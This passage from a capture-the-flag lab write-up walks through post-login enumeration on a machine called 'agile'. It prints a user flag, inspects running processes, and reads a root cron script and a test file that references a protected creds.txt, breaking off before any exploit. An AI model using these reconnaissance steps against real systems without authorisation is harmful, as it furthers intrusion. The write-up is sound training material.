</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This system has been minimized by removing packages and content that are
</span></span><span class=line><span class=cl>not required on a system that users <span class=k>do</span> not log into.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>To restore this content, you can run the <span class=s1>&#39;unminimize&#39;</span> command.
</span></span><span class=line><span class=cl>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class=line><span class=cl>permitted by applicable law.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Sun Mar <span class=m>19</span> 10:46:24 <span class=m>2023</span> from 10.10.14.8
</span></span><span class=line><span class=cl>corum@agile:~$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>48</span>
</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>8</span> corum corum <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>5</span> root  root  <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root  root     <span class=m>9</span> Feb  <span class=m>6</span> 16:56 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> corum corum  <span class=m>220</span> Jan  <span class=m>6</span>  <span class=m>2022</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> corum corum <span class=m>3771</span> Jan  <span class=m>6</span>  <span class=m>2022</span> .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>4</span> corum corum <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .cache
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> corum corum <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .config
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> corum corum <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .local
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> corum corum <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .pki
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> corum corum  <span class=m>807</span> Jan  <span class=m>6</span>  <span class=m>2022</span> .profile
</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>3</span> corum corum <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .pytest_cache
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> corum corum <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .ssh
</span></span><span class=line><span class=cl>-rw-r----- <span class=m>1</span> root  corum   <span class=m>33</span> Mar <span class=m>17</span> 13:57 user.txt
</span></span><span class=line><span class=cl>corum@agile:~$ cat user.txt
</span></span><span class=line><span class=cl>21a772da7732cedce86d0343dfaebdd0
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation>Privilege Escalation</h2><p>Now we focus on privilege escalating to root from the <code>corum</code> user</p><p>I quickly verified I was unable to run <code>sudo -l</code>. Let&rsquo;s check running processes using <code>ps</code> with the helpful <code>--forest</code> flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>corum@agile:/app$ ps aux --forest --cols <span class=m>300</span>
</span></span><span class=line><span class=cl>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span class=line><span class=cl>root           <span class=m>1</span>  0.0  0.2 <span class=m>100516</span> <span class=m>11168</span> ?        Ss   05:37   0:09 /sbin/init
</span></span><span class=line><span class=cl>root         <span class=m>486</span>  0.0  0.2  <span class=m>80640</span> <span class=m>10640</span> ?        S&lt;s  05:38   0:06 /lib/systemd/systemd-journald
</span></span><span class=line><span class=cl>root         <span class=m>527</span>  0.0  0.6 <span class=m>289348</span> <span class=m>27100</span> ?        SLsl 05:38   0:01 /sbin/multipathd -d -s
</span></span><span class=line><span class=cl>root         <span class=m>538</span>  0.0  0.1  <span class=m>25076</span>  <span class=m>6004</span> ?        Ss   05:38   0:00 /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>systemd+     <span class=m>558</span>  0.0  0.1  <span class=m>89356</span>  <span class=m>6488</span> ?        Ssl  05:38   0:01 /lib/systemd/systemd-timesyncd
</span></span><span class=line><span class=cl>systemd+     <span class=m>565</span>  0.0  0.2  <span class=m>16120</span>  <span class=m>8176</span> ?        Ss   05:38   0:00 /lib/systemd/systemd-networkd
</span></span><span class=line><span class=cl>root         <span class=m>566</span>  0.0  0.0  <span class=m>85224</span>  <span class=m>2176</span> ?        S&lt;sl 05:38   0:01 /sbin/auditd
</span></span><span class=line><span class=cl>_laurel      <span class=m>568</span>  0.0  0.1   <span class=m>9732</span>  <span class=m>5936</span> ?        S&lt;   05:38   0:01  <span class=se>\_</span> /usr/local/sbin/laurel --config /etc/laurel/config.toml
</span></span><span class=line><span class=cl>root         <span class=m>582</span>  0.0  0.2  <span class=m>48572</span> <span class=m>11396</span> ?        Ss   05:38   0:00 /usr/bin/VGAuthService
</span></span><span class=line><span class=cl>root         <span class=m>588</span>  0.1  0.2 <span class=m>313340</span>  <span class=m>9932</span> ?        Ssl  05:38   0:22 /usr/bin/vmtoolsd
</span></span><span class=line><span class=cl>systemd+     <span class=m>622</span>  0.0  0.3  <span class=m>25656</span> <span class=m>13680</span> ?        Ss   05:38   0:03 /lib/systemd/systemd-resolved
</span></span><span class=line><span class=cl>message+     <span class=m>750</span>  0.0  0.1   <span class=m>8664</span>  <span class=m>4980</span> ?        Ss   05:38   0:00 @dbus-daemon --system --address<span class=o>=</span>systemd: --nofork --nopidfile --systemd-activation --syslog-only
</span></span><span class=line><span class=cl>root         <span class=m>756</span>  0.0  0.4  <span class=m>30120</span> <span class=m>18748</span> ?        Ss   05:38   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
</span></span><span class=line><span class=cl>root         <span class=m>762</span>  0.0  0.1  <span class=m>15512</span>  <span class=m>7536</span> ?        Ss   05:38   0:00 /lib/systemd/systemd-logind
</span></span><span class=line><span class=cl>root         <span class=m>781</span>  0.0  0.1 <span class=m>101236</span>  <span class=m>6004</span> ?        Ssl  05:38   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
</span></span><span class=line><span class=cl>root        <span class=m>1008</span>  0.0  0.0   <span class=m>4304</span>  <span class=m>2672</span> ?        Ss   05:38   0:00 /usr/sbin/cron -f -P
</span></span><span class=line><span class=cl>root        <span class=m>8732</span>  0.0  0.1   <span class=m>7756</span>  <span class=m>4156</span> ?        S    09:38   0:00  <span class=se>\_</span> /usr/sbin/CRON -f -P
</span></span><span class=line><span class=cl>runner      <span class=m>8735</span>  0.0  0.0   <span class=m>2888</span>   <span class=m>968</span> ?        Ss   09:38   0:00      <span class=se>\_</span> /bin/sh -c /app/test_and_update.sh
</span></span><span class=line><span class=cl>runner      <span class=m>8738</span>  0.0  0.0   <span class=m>4780</span>  <span class=m>3304</span> ?        S    09:38   0:00          <span class=se>\_</span> /bin/bash /app/test_and_update.sh
</span></span><span class=line><span class=cl>runner      <span class=m>8743</span>  0.1  0.7  <span class=m>37880</span> <span class=m>31700</span> ?        S    09:38   0:00              <span class=se>\_</span> /app/venv/bin/python3 /app/venv/bin/pytest -x
</span></span><span class=line><span class=cl>runner      <span class=m>8744</span>  0.0  0.3 <span class=m>33625804</span> <span class=m>13784</span> ?      Sl   09:38   0:00                  <span class=se>\_</span> chromedriver --port<span class=o>=</span><span class=m>37157</span>
</span></span><span class=line><span class=cl>runner      <span class=m>8750</span>  0.2  2.6 <span class=m>33978328</span> <span class=m>103904</span> ?     Sl   09:38   0:00                      <span class=se>\_</span> /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir<span class=o>=</span>/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --dis
</span></span><span class=line><span class=cl>runner      <span class=m>8754</span>  0.0  0.0   <span class=m>3348</span>  <span class=m>1052</span> ?        S    09:38   0:00                          <span class=se>\_</span> cat
</span></span><span class=line><span class=cl>runner      <span class=m>8755</span>  0.0  0.0   <span class=m>3348</span>  <span class=m>1048</span> ?        S    09:38   0:00                          <span class=se>\_</span> cat
</span></span><span class=line><span class=cl>runner      <span class=m>8762</span>  0.0  1.4 <span class=m>33822080</span> <span class=m>57004</span> ?      S    09:38   0:00                          <span class=se>\_</span> /opt/google/chrome/chrome --type<span class=o>=</span>zygote --no-zygote-sandbox --enable-logging --headless --log-level<span class=o>=</span><span class=m>0</span> --headless --crashpad-handler-pid<span class=o>=</span><span class=m>8757</span> --enable-crash-reporter
</span></span><span class=line><span class=cl>runner      <span class=m>8782</span>  0.0  1.9 <span class=m>33916484</span> <span class=m>76568</span> ?      Sl   09:38   0:00                          <span class=p>|</span>   <span class=se>\_</span> /opt/google/chrome/chrome --type<span class=o>=</span>gpu-process --enable-logging --headless --log-level<span class=o>=</span><span class=m>0</span> --ozone-platform<span class=o>=</span>headless --use-angle<span class=o>=</span>swiftshader-webgl --headless --crashpad-handler-pid<span class=o>=</span><span class=m>8757</span> --gpu-preferences<span class=o>=</span>W
</span></span><span class=line><span class=cl>runner      <span class=m>8763</span>  0.0  1.4 <span class=m>33822072</span> <span class=m>57584</span> ?      S    09:38   0:00                          <span class=se>\_</span> /opt/google/chrome/chrome --type<span class=o>=</span>zygote --enable-logging --headless --log-level<span class=o>=</span><span class=m>0</span> --headless --crashpad-handler-pid<span class=o>=</span><span class=m>8757</span> --enable-crash-reporter
</span></span><span class=line><span class=cl>runner      <span class=m>8765</span>  0.0  0.3 <span class=m>33822096</span> <span class=m>15320</span> ?      S    09:38   0:00                          <span class=p>|</span>   <span class=se>\_</span> /opt/google/chrome/chrome --type<span class=o>=</span>zygote --enable-logging --headless --log-level<span class=o>=</span><span class=m>0</span> --headless --crashpad-handler-pid<span class=o>=</span><span class=m>8757</span> --enable-crash-reporter
</span></span><span class=line><span class=cl>runner      <span class=m>8812</span>  0.5  3.1 <span class=m>1184727420</span> <span class=m>124560</span> ?   Sl   09:38   0:02                          <span class=p>|</span>       <span class=se>\_</span> /opt/google/chrome/chrome --type<span class=o>=</span>renderer --headless --crashpad-handler-pid<span class=o>=</span><span class=m>8757</span> --lang<span class=o>=</span>en-US --enable-automation --enable-logging --log-level<span class=o>=</span><span class=m>0</span> --remote-debugging-port<span class=o>=</span><span class=m>41829</span> --test-type<span class=o>=</span>webdriver 
</span></span><span class=line><span class=cl>runner      <span class=m>8783</span>  0.0  2.1 <span class=m>33871408</span> <span class=m>83872</span> ?      Sl   09:38   0:00                          <span class=se>\_</span> /opt/google/chrome/chrome --type<span class=o>=</span>utility --utility-sub-type<span class=o>=</span>network.mojom.NetworkService --lang<span class=o>=</span>en-US --service-sandbox-type<span class=o>=</span>none --enable-logging --log-level<span class=o>=</span><span class=m>0</span> --use-angle<span class=o>=</span>swiftshader-webgl --use-gl<span class=o>=</span>angle
</span></span><span class=line><span class=cl>root        <span class=m>1014</span>  0.0  0.2  <span class=m>15424</span>  <span class=m>9204</span> ?        Ss   05:38   0:00 sshd: /usr/sbin/sshd -D <span class=o>[</span>listener<span class=o>]</span> <span class=m>0</span> of 10-100 startups
</span></span><span class=line><span class=cl>root        <span class=m>8596</span>  0.0  0.2  <span class=m>17172</span> <span class=m>10900</span> ?        Ss   09:36   0:00  <span class=se>\_</span> sshd: corum <span class=o>[</span>priv<span class=o>]</span>
</span></span><span class=line><span class=cl>corum       <span class=m>8625</span>  0.0  0.1  <span class=m>17304</span>  <span class=m>7956</span> ?        S    09:36   0:00      <span class=se>\_</span> sshd: corum@pts/0
</span></span><span class=line><span class=cl>corum       <span class=m>8626</span>  0.0  0.1   <span class=m>5144</span>  <span class=m>4060</span> pts/0    Ss   09:36   0:00          <span class=se>\_</span> -bash
</span></span><span class=line><span class=cl>corum      <span class=m>23790</span>  0.0  0.0   <span class=m>7816</span>  <span class=m>3632</span> pts/0    R+   09:45   0:00              <span class=se>\_</span> ps aux --forest --cols <span class=m>300</span>
</span></span><span class=line><span class=cl>root        <span class=m>1025</span>  0.0  0.0  <span class=m>55816</span>  <span class=m>1760</span> ?        Ss   05:38   0:00 nginx: master process /usr/sbin/nginx -g daemon on<span class=p>;</span> master_process on<span class=p>;</span>
</span></span><span class=line><span class=cl>www-data    <span class=m>1030</span>  0.0  0.1  <span class=m>56124</span>  <span class=m>6412</span> ?        S    05:38   0:00  <span class=se>\_</span> nginx: worker process
</span></span><span class=line><span class=cl>www-data    <span class=m>1031</span>  0.0  0.1  <span class=m>56124</span>  <span class=m>6480</span> ?        S    05:38   0:00  <span class=se>\_</span> nginx: worker process
</span></span><span class=line><span class=cl>root        <span class=m>1034</span>  0.0  0.0   <span class=m>3192</span>  <span class=m>1076</span> tty1     Ss+  05:38   0:00 /sbin/agetty -o -p -- <span class=se>\u</span> --noclear tty1 linux
</span></span><span class=line><span class=cl>mysql       <span class=m>1035</span>  0.9 11.3 <span class=m>1797076</span> <span class=m>451536</span> ?      Ssl  05:38   2:19 /usr/sbin/mysqld
</span></span><span class=line><span class=cl>runner      <span class=m>1083</span>  0.0  0.6  <span class=m>31000</span> <span class=m>24388</span> ?        Ss   05:38   0:02 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
</span></span><span class=line><span class=cl>runner      <span class=m>1092</span>  0.0  1.5  <span class=m>79900</span> <span class=m>62488</span> ?        S    05:38   0:11  <span class=se>\_</span> /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
</span></span><span class=line><span class=cl>www-data    <span class=m>1084</span>  0.0  0.6  <span class=m>31000</span> <span class=m>24456</span> ?        Ss   05:38   0:02 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads<span class=o>=</span><span class=m>10</span> --timeout <span class=m>600</span> wsgi:app
</span></span><span class=line><span class=cl>www-data    <span class=m>1091</span>  0.0  1.6 <span class=m>449400</span> <span class=m>67584</span> ?        Sl   05:38   0:09  <span class=se>\_</span> /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads<span class=o>=</span><span class=m>10</span> --timeout <span class=m>600</span> wsgi:app
</span></span><span class=line><span class=cl>corum       <span class=m>8599</span>  0.0  0.2  <span class=m>17052</span>  <span class=m>9448</span> ?        Ss   09:36   0:00 /lib/systemd/systemd --user
</span></span><span class=line><span class=cl>corum       <span class=m>8600</span>  0.0  0.0 <span class=m>103440</span>  <span class=m>3524</span> ?        S    09:36   0:00  <span class=se>\_</span> <span class=o>(</span>sd-pam<span class=o>)</span>
</span></span><span class=line><span class=cl>corum      <span class=m>15815</span>  0.0  0.0  <span class=m>78824</span>  <span class=m>2924</span> ?        SLs  09:39   0:00  <span class=se>\_</span> /usr/bin/gpg-agent --supervised
</span></span><span class=line><span class=cl>runner      <span class=m>8757</span>  0.0  0.0 <span class=m>33575872</span> <span class=m>1640</span> ?       Sl   09:38   0:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation<span class=o>=</span><span class=nv>ptype</span><span class=o>=</span>crashpad-handler --database<span class=o>=</span>/tmp --url<span class=o>=</span>https://clients2.google.com/cr/report --annotation<span class=o>=</span><span class=nv>channel</span><span class=o>=</span> --annotation<span class=o>=</span>lsb-release<span class=o>=</span>Ubuntu 22.04.2 LTS --annotation<span class=o>=</span>pl
</span></span><span class=line><span class=cl>corum@agile:/app$ 
</span></span></code></pre></td></tr></table></div></div><p>Can we read the <code>test_and_update.sh</code> script that appears to be running via cron above?:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>corum@agile:/app$ cat test_and_update.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># update prod with latest from testing constantly assuming tests are passing</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Starting test_and_update&#34;</span>
</span></span><span class=line><span class=cl>date
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if already running, exit</span>
</span></span><span class=line><span class=cl>ps auxww <span class=p>|</span> grep -v <span class=s2>&#34;grep&#34;</span> <span class=p>|</span> grep -q <span class=s2>&#34;pytest&#34;</span> <span class=o>&amp;&amp;</span> <span class=nb>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Not already running. Starting...&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># start in dev folder</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> /app/app-testing
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># system-wide source doesn&#39;t seem to happen in cron jobs</span>
</span></span><span class=line><span class=cl><span class=nb>source</span> /app/venv/bin/activate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># run tests, exit if failure</span>
</span></span><span class=line><span class=cl>pytest -x 2&gt;<span class=p>&amp;</span><span class=m>1</span> &gt;/dev/null <span class=o>||</span> <span class=nb>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># tests good, update prod (flask debug mode will load it instantly)</span>
</span></span><span class=line><span class=cl>cp -r superpass /app/app/
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Complete!&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>So, we print out <em>&ldquo;Starting test_and _update</em>&rdquo;, print a timestamp. If <code>pytest</code> is already running (and <code>ps</code> above shows it is) then exit.</p><p>Otherwise, we <code>cd</code> into <code>/app/app-testing</code>, we <code>source /app/venv/bin/activate</code>, then run <code>pytest -x</code> before recursively copying the <code>superpass/</code> directory into <code>/app/app</code></p><p>We can do this manually:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>corum@agile:~$ <span class=nb>cd</span> /app/app-testing
</span></span><span class=line><span class=cl>corum@agile:/app/app-testing$ <span class=nb>source</span> /app/venv/bin/activate
</span></span><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> corum@agile:/app/app-testing$ pytest -x
</span></span><span class=line><span class=cl><span class=o>======================================================================</span> <span class=nb>test</span> session <span class=nv>starts</span> <span class=o>=======================================================================</span>
</span></span><span class=line><span class=cl>platform linux -- Python 3.10.6, pytest-7.2.0, pluggy-1.0.0
</span></span><span class=line><span class=cl>rootdir: /app/app-testing
</span></span><span class=line><span class=cl>collected <span class=m>0</span> items / <span class=m>1</span> <span class=nv>error</span>                                                                                                                                      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>=============================================================================</span> <span class=nv>ERRORS</span> <span class=o>=============================================================================</span>
</span></span><span class=line><span class=cl>__________________________________________________ ERROR collecting tests/functional/test_site_interactively.py __________________________________________________
</span></span><span class=line><span class=cl>tests/functional/test_site_interactively.py:10: in &lt;module&gt;
</span></span><span class=line><span class=cl>    with open<span class=o>(</span><span class=s1>&#39;/app/app-testing/tests/functional/creds.txt&#39;</span>, <span class=s1>&#39;r&#39;</span><span class=o>)</span> as f:
</span></span><span class=line><span class=cl>E   PermissionError: <span class=o>[</span>Errno 13<span class=o>]</span> Permission denied: <span class=s1>&#39;/app/app-testing/tests/functional/creds.txt&#39;</span>
</span></span><span class=line><span class=cl><span class=o>========================================================================</span> warnings <span class=nv>summary</span> <span class=o>========================================================================</span>
</span></span><span class=line><span class=cl>../venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:433
</span></span><span class=line><span class=cl>  /app/venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:433: PytestCacheWarning: cache could not write path /app/app-testing/.pytest_cache/v/cache/nodeids
</span></span><span class=line><span class=cl>    config.cache.set<span class=o>(</span><span class=s2>&#34;cache/nodeids&#34;</span>, sorted<span class=o>(</span>self.cached_nodeids<span class=o>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>../venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:387
</span></span><span class=line><span class=cl>  /app/venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:387: PytestCacheWarning: cache could not write path /app/app-testing/.pytest_cache/v/cache/lastfailed
</span></span><span class=line><span class=cl>    config.cache.set<span class=o>(</span><span class=s2>&#34;cache/lastfailed&#34;</span>, self.lastfailed<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>../venv/lib/python3.10/site-packages/_pytest/stepwise.py:52
</span></span><span class=line><span class=cl>  /app/venv/lib/python3.10/site-packages/_pytest/stepwise.py:52: PytestCacheWarning: cache could not write path /app/app-testing/.pytest_cache/v/cache/stepwise
</span></span><span class=line><span class=cl>    session.config.cache.set<span class=o>(</span>STEPWISE_CACHE_DIR, <span class=o>[])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
</span></span><span class=line><span class=cl><span class=o>====================================================================</span> short <span class=nb>test</span> summary <span class=nv>info</span> <span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>ERROR tests/functional/test_site_interactively.py - PermissionError: <span class=o>[</span>Errno 13<span class=o>]</span> Permission denied: <span class=s1>&#39;/app/app-testing/tests/functional/creds.txt&#39;</span>
</span></span><span class=line><span class=cl>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! stopping after <span class=m>1</span> failures !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span></span><span class=line><span class=cl>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Interrupted: <span class=m>1</span> error during collection !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span></span><span class=line><span class=cl><span class=o>==================================================================</span> <span class=m>3</span> warnings, <span class=m>1</span> error in 0.27s <span class=o>==================================================================</span>
</span></span></code></pre></td></tr></table></div></div><p>We see the following in <code>/app/app-testing/tests/functional</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> corum@agile:/app/app-testing$ ls -la tests/functional/
</span></span><span class=line><span class=cl>total <span class=m>20</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> runner    runner <span class=m>4096</span> Feb  <span class=m>7</span> 13:12 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> runner    runner <span class=m>4096</span> Feb  <span class=m>6</span> 18:10 ..
</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> runner    runner <span class=m>4096</span> Mar <span class=m>23</span> 10:00 __pycache__
</span></span><span class=line><span class=cl>-rw-r----- <span class=m>1</span> dev_admin runner   <span class=m>34</span> Mar <span class=m>23</span> 10:03 creds.txt
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> runner    runner <span class=m>2663</span> Mar <span class=m>23</span> 10:03 test_site_interactively.py
</span></span></code></pre></td></tr></table></div></div><p>Only <code>test_site_interactively.py</code> is readable:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
